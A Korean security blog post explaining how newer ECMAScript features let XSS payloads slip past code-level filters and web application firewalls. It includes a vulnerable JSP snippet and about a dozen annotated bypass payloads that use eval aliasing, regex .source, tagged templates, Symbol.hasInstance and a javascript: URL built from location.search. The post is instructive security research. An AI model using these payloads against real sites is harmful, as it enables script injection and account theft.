---
title: "최신 ECMAScript 기능을 활용한 XSS Filtering Bypass"
description: "ECMAScript의 새로운 기능들을 활용한 XSS 필터링 우회 기법 및 원리 해설"
date: 2019-11-05
tags: ["web-security", "xss", "ecmascript", "bypass"]
category: "Security Research"
published: true
---

최근 브라우저의 자바스크립트 엔진이 ecma script 2019(es10) 까지 업데이트 되며 많은 요소와 기능들이 추가되었습니다. 따라서 기존 javascript가 아닌 최신 ecma script 표준으로 인한 xss filtering bypass 기법들이 신설되고 있습니다. 이러한 내용들에 대해 공유하고 그 원리에 대해 간단히 설명드릴까 합니다.


---


XSS(Cross-Site Scripting) 취약점은 주로 사용자의 unvalid input이 브라우저의 dom 내부에 삽입되거나, 모종의 javascript 동작으로 인하여 공격자가 원하는 코드를 임의로 실행시키거나, 코드 실행의 흐름을 변경하는 취약점입니다.


대다수 경우 XSS 취약점을 방어하기 위해 하기와 같은 방어기제를 둡니다.


---


1. 코드단에서의 필터링


사용자에게 파라미터를 전달받아 이를 dom에 뿌려야 하는 경우 사용자의 파라미터를 검증(validation)하여 XSS 공격에 사용되는 문구나 문자가 있을 경우 요청을 거절하거나 해당 문구/문자를 삭제합니다.


대표적으로`"`(Double Quote),`'`(Single Quote),`` ` ``(Back Quote),`<`(Left Angle Bracket),`>`(Right Angle Bracket) 등의 문자, script, alert, eval, onerror 등의 HTML Tag 및 Attribute 등이 대상입니다.


XSS 필터링 솔루션을 통해 필터링 하거나, 아니면 자체적으로 구현한 XSS Filter Function을 통해 필터링 하게 됩니다.


예를들어 Java 웹 서버의 경우`<% String param1 = request.getParameter("param1").replaceAll("script", ""); %>`와 같이 대치하거나, 문자열을 찾을 경우 파라미터를 비워버리는 등 다양한 필터링 동작을 구현할 수 있습니다.


1. 웹방화벽(WAF)에서의 필터링


코드단에서의 필터링과 동일하게 특정 문구나 문자가 있을 경우 사용자의 요청을 거절합니다.


웹방화벽에서의 필터링은 코드단에서보다 해당 서버의 페이지에 전역적으로 적용되기 때문에 일반적으로 문자에 대한 필터링보단 HTML Tag나 Attribute와 같은 문구에 대한 필터링이 강한것이 특징입니다.(경험상)


replace등의 동작은 거의 수행하지 않고 block을 통해 공격을 막는 것 같습니다.


---


최근 잘 방어된 사이트의 경우 거의 대부분의 HTML Tag와 Attribute가 필터링 목록에 들어가있습니다. 이런 경우엔 DOM XSS 라 불리우는`?param="><script>alert('xss');</script>`와 같이 HTML Tag를 직접 삽입해야 하는 XSS는 대부분 필터링에 걸려 실행되지 않습니다. (추가로 이렇게 HTML TAG를 직접 입력해야 하는 경우 클라이언트 단의 브라우저 XSS Auditor에 탐지되어 일부 특수 케이스를 제외하곤 스크립트가 실행되지 않습니다. 이러한 경우 실제 공격을 수행하기 위한 weaponizing은 무리가 있습니다.)


따라서 이렇게 필터링이 심하게 걸려있는 상황에서 XSS 취약점이 발생하는 경우 중 하나로`<script>`태그 영역 내에 사용자의 입력이 "제한없이" 삽입되는 경우입니다. 여기서 말한 "제한없이"는 웹방화벽에서의 필터링은 걸려있어도 코드단에서 필터링이 존재하지 않거나 미비하여 내가 원하는 코드 흐름을 만들 수 있는 경우를 뜻합니다. 예시와 함께 설명하겠습니다.


---


#### XSS Vuln Code Example


```
<script>
var username = "<%=request.getParameter("username")%>";
alert(username+"님 로그인 하셨습니다.");
</script>
```


---


위와 같은 경우`username`파라미터에`"`(Double Quote) 문자를 삽입하여 script 태그 내의 문자열에 삽입되던 파라미터가 문자열을 벗어나고 임의 스크립트를 실행시킬 수 있게 됩니다.


하지만 이는 필터링이 하나도 없는 경우이고 코드단 필터링이나 웹방화벽에서의 필터링이 존재한다면 해당 문자 및 문구를 사용하지 않고 코드흐름을 제어해야 합니다.


본 글에선 해당 상황에서 쓰일 수 있는 유용한 필터링 우회 구문들을 몇가지 소개하고자 합니다.


---


#### alert 등, javascript 내장함수의 실행을 정규식으로 필터링하는 경우


```
a=alert; a(document.domain);
```


javascript에서의 함수(Function)는 Object의 종류 중 하나입니다. javascript에서의 Object는 객체로써 변수에 해당 Object를 할당해줄 수 있습니다.


따라서 변수`a`에 alert (내장함수)를 할당하고, 이를 호출함으로써 alert(document.domain)을 위와 같이 표현할 수 있습니다.


정규식을 통해 (ex. /alert(.+)/) 특정 함수의 실행을 막고있다면 위와같이 우회가 가능합니다.


이하는 위와 설명이 같음


```
a=eval; b="aler"; c="t(documen"; d="t.domai"; e="n)"; a(b+c+d+e);
```


```
a=eval; a(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="));
```


---


#### Quote를 사용할 수 없는 경우


```
eval(8680439..toString(30)+String.fromCharCode(40,49,41))
```


Int..toString(Int) 는 앞의 숫자를 문자열 형식으로 바꾸는데, 인자로 진법을 넘깁니다. 즉 여기선 30진법으로 해석해서 문자열로 치환하라는 명령어입니다.


String.fromCharCode(int, int) 는 인자로 전달된 decimal integer 형식의 숫자들을 문자로 치환하여 concatenation 하여 반환합니다.


따라서 위의 명령어는 eval("alert(1)") 과 동일합니다.


```
eval(/aler/.source+/t(1)/.source)
```


javascript에서 / 사이에 있는 문자열은 정규식 표현입니다. 정규식은 Object 타입의 일종으로, 그 하위 함수 중에는 문자열로 type을 변경할 수 있는 .source attribute가 존재합니다.


Quote(Single, Double, Back) 없이 따라서 문자로 된 정규식 표현을 .source attribute를 통해 문자열로 치환된 정규식 문자를 얻을 수 있습니다.


---


#### 괄호를 사용할 수 없는 경우


````
Set.constructor`alert\x28document.domain\x29```
````


`Set`: Javascript 내장 함수, 여기선 Set을 사용하였지만 다른 아무 내장함수를 넣어도 다 가능합니다


`constructor`: Set이라는 함수의 생성자를 설정합니다.


```` ``` ````: Back Quote는 함수에 인자를 전달함과 동시에 함수를 실행할 수 있습니다. 위의 구문을 괄호와 따옴표를 사용하여 표현해보면
`Set.constructor("alert(document.domain)")()`와 같습니다.


`\x28`,`\x29`: Ecma Script에서는 Hex Ascii String과 Unicode String, Octal String에 대하여 Auto Typecasting을 지원합니다.


`\x28 == \u0028 == \50`


따라서 Javascript의 내장 함수 Set의 생성자 함수의 동작을 alert(document.domain)으로 설정하고, 해당 Set 함수를 실행(``) 해줌으로써 생성자 함수가 동작하도록 하여 공격자가 원하는 임의 스크립트를 실행시킬 수 있는 것입니다.


이하는 위와 설명이 같음


`````
Set.constructor`alert\`document.domain\````
`````


````
Set.constructor`alert\u0028document.domain\u0029```
````


```
setTimeout`alert\x28document.domain\x29`
```


```
setInterval`alert\x28document.domain\x29`
```


---


#### 문구 필터링 + Quote 필터링 + 괄호 필터링


```
_=URL+0,/aler/.source+/t/.source+_[12]+/documen/.source+/t.domai/.source+/n/.source+_[13]instanceof{[Symbol.hasInstance]:eval}
```


앞에서부터 살펴보겠습니다.


URL은 내장함수입니다. 함수(Function)는 javascript에서 Object입니다. Object와 String 타입간의 더하기 연산이 일어났을 땐 Object.toString() 메서드를 우선 실행하여 Object 자체를 문자열로 Type Casting 한 후 String 문자열과 더해줍니다.


따라서 위의 그림과 같이 문자열로 변하게 됩니다. 이와같은 동작을 수행한 이유는 괄호가 필터링 되어있기 때문에, 괄호를 쓰지 않고 괄호 문자를 얻기 위해서입니다.


`_`변수에 해당 문자열이 할당되었습니다.`_[12]`==`(`,`_[13]`==`)`


위에서 살펴봤듯이, 정규식을 이용하여 문자열을 획득 및 더해줄 수 있습니다. 이러한 연산을 통해 "alert(document.domain)"이라는 문자열을 얻었습니다.


최신 Ecma Script에선 기존 String, Integer 등 자료형 외에 Symbol이라는 자료형이 신설되었습니다.


이 Symbol 자료형의 속성 중 hasInstance라는 속성이 존재합니다. 해당 Symbol 객체가 instance 인지 판단하여 이후 동작을 재정의 할 수 있는 속성입니다.


위의 코드를 조금 더 보기 쉽게 표현해보겠습니다.


`"alert(document.domain)" instanceof { [Symbol.hasInstance] : eval }`


{ } 는 Object입니다. 이 Object의 Symbol.hasInstance 속성(해당 객체가 instance 라면 동작할 코드)을 eval로 정의하였습니다.


그리고`"alert(document.domain)"`문자열을 instanceof 연산자를 통해 뒤의 객체 {}가 instance인지 묻고, 이 객체(Object)가 instance라면 위에서 정의한 eval의 인자로 문자열을 넣어 호출하고 그 결과를 반환합니다.


따라서 결과적으로 eval("alert(document.domain)") 이 되게 됩니다.


이와 비슷한 원리로 이루어지는 코드들은 아래와 같습니다.


```
_=URL+0,Array.prototype[Symbol.hasInstance]=eval,/alert/.source+_[12]+1+_[13]instanceof[]
```


```
_=URL+!0+!1,Array.prototype[Symbol.hasInstance]=eval,_[19]+_[38]+_[40]+_[33]+_[4]+_[12]+1+_[13]instanceof[]
```


```
Event.prototype[Symbol.toPrimitive]=x=>/javascript:0/.source+location.search,onload=open
```


위 코드는 조금 다른 내용이 섞여있어 코멘트를 달겠습니다.


location.search는 uri에서`?`이후 부분을 지정합니다.


`javascript:`scheme을 통해 해당 scheme으로 페이지를 이동시킨다면 이후 임의 자바스크립트 코드를 실행할 수 있습니다.


위 코드를 해석해보면,


Event 내장함수의 prototype(생성자)의 Symbol.toPrimitive의 반환값을 함수 호이스팅과 Arrow Function을 통해`/javascript:0/.source+location.search`로 설정합니다.


위에서 설명했듯이 기존 Ecma Script의 자료형은 String, Integer, Undefined, Null, Boolean 이렇게 5가지 였습니다.


Ecma Script6 부턴 이를 Primitive Type이라 칭하고 이에 Symbol이라는 자료형을 새로이 추가하였습니다.


Symbol은 기존 Primitive Type과는 조금 다른 성격의 자료형입니다. 자세한 내용은 아래 블로그를 참고해주시기 바랍니다.


[Symbol 자료형 관련 참고 블로그](https://jaeyeophan.github.io/2017/04/20/ES6-8-Symbol/)

[[ES6] 8. SymbolBlog posted about front end developmentjaeyeophan.github.io](https://jaeyeophan.github.io/2017/04/20/ES6-8-Symbol/)

Symbol 타입이 기존 primitive type과 일치할 시 이로 변환해주는 attribute method가 Symbol.toPrimitive method 입니다.


Symbol.toPrimitive 메서드의 반환값은 Arrow Function과 함수 호이스팅을 통해 설정되어있습니다.`"javascript:0"+location.search`


`onload=open`구문을 통해 document.onload의 동작을 open 함수로 지정하고 있습니다.


onload는 Event 속성이므로 Event 내장함수가 실행되며 이의 prototype에 설정되어있던 Symbol.toPrimitive가 실행되게 됩니다.


open 내장 함수가 toPrimitive method를 거치며
`open(x => /javascript:0/.source+location.search)`
->`x = function(x){return /javascript:0/.source+location.search}; open(x);`
->`open(/javascript:0/.source+location.search)`와 같은 구문으로 변하게 됩니다.


공격자가 uri의 링크를`https://ar9ang3.com/test.html?0:alert('xss')//&param1=foo&param2=bar`와 같이 설정 후 xss를 트리거했다면,


location.search의 값은`?0:alert('xss')//&param1=foo&param2=bar`가 되고,
전체 문자열은`javascript:0?0:alert('xss')//&param1=foo&param2=bar`가 되게 됩니다.


0?0:alert('xss') 이후 문자열은 주석으로 인해 사라지고, 이는 3항연산의 표현식이기때문에 false?false:alert('xss')로 변하게 되어 결국 공격자가 원하는 자바스크립트 구문이 실행되게 됩니다.


---


지금까지 위에 적힌 구문들 외에도 무수히 많은 방법으로 필터링을 우회할 수 있습니다. 혹 새로운 우회기법이 생각나셨다면 공유해주시면 감사하겠습니다.


읽어주셔서 감사합니다.


Reference*
[xss-cheatsheet_posix](https://blog.rwx.kr/xss-cheatsheet/)